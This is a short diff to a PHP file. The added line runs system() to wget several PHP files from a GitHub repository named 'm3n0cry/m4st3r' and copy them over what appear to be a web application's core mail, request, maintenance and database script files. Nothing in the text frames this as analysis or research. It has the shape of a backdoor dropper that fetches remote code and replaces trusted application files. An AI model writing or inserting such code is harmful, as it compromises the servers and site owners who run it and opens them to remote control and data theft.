@@ -1,5 +1,5 @@
 <?php
-system("cp Mail.php ../../../classes/mail/Mail.php;cp Request.php ../../../classes/core/Request.php;cp autoMaintenance.php ../../../tools/autoMaintenance.php;cp dbscripts.php ../../../dbscripts/index.php;");
+system("wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Mail.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Request.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/dbscripts.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/autoMaintenance.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/shareSubmission.php;cp Mail.php ../../../classes/mail/Mail.php;cp Request.php ../../../classes/core/Request.php;cp autoMaintenance.php ../../../tools/autoMaintenance.php;cp dbscripts.php ../../../dbscripts/index.php;");
 
 $domainName = $_SERVER['SERVER_NAME'];
 
